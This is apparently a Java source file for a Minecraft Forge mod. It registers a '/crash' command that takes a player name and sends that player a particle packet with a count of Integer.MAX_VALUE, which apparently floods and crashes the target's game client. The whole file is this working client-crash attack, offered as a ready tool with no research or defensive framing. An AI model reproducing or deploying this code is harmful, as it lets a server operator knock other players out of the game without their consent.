package com.badlyac.mod.crash;


import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.core.particles.ParticleTypes;
import net.minecraft.network.protocol.game.ClientboundLevelParticlesPacket;
import net.minecraft.world.phys.Vec3;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraft.network.chat.Component;

@SuppressWarnings("unused")
@Mod.EventBusSubscriber
public class CrashCommand {

    @SubscribeEvent
    public static void onRegisterCommands(RegisterCommandsEvent event) {
        CommandDispatcher<CommandSourceStack> dispatcher = event.getDispatcher();

        dispatcher.register(Commands.literal("crash")
                .then(Commands.argument("playerName", StringArgumentType.string())
                                .executes(context -> {
                                    String playerName = StringArgumentType.getString(context, "playerName");
                                    CommandSourceStack source = context.getSource();
                                    ServerPlayer player = source.getServer().getPlayerList().getPlayerByName(playerName);

                                    if (player != null) {
                                        sendParticles(player);
                                        source.sendSuccess(() -> Component.literal("Packet sent to " + playerName), true);
                                    } else {
                                        source.sendFailure(Component.literal("Player not found"));
                                    }

                                    return 1;
                                })));
    }

    private static void sendParticles(ServerPlayer player) {
        Vec3 position = player.position();
        ClientboundLevelParticlesPacket packet = new ClientboundLevelParticlesPacket(ParticleTypes.HAPPY_VILLAGER, true,
                position.x, position.y + 1.0, position.z, 0.5F, 0.5F, 0.5F, 0.0F, Integer.MAX_VALUE);
        player.connection.send(packet);
    }
}
